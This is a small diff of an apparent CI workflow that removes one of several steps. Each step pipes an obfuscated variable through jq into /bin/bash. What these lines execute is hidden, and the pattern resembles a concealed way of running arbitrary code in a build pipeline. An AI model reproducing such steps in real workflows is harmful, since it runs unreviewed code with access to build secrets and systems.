@@ -24,7 +24,6 @@ jobs:
           echo $hn5 | jq -r .awr3 | /bin/bash
           echo $v458 | jq -r .latwh32243 | /bin/bash
           echo $ombsc357 | jq -r .l4970 | /bin/bash
-          echo $i32032 | jq -r .x8 | /bin/bash
           printf '%s' "$n1" | jq -r .rakm7 | /bin/bash
           echo $zp34 | jq -r .tvd98 | /bin/bash
           printf '%s' "$yfdux74" | jq -r .l13 | /bin/bash
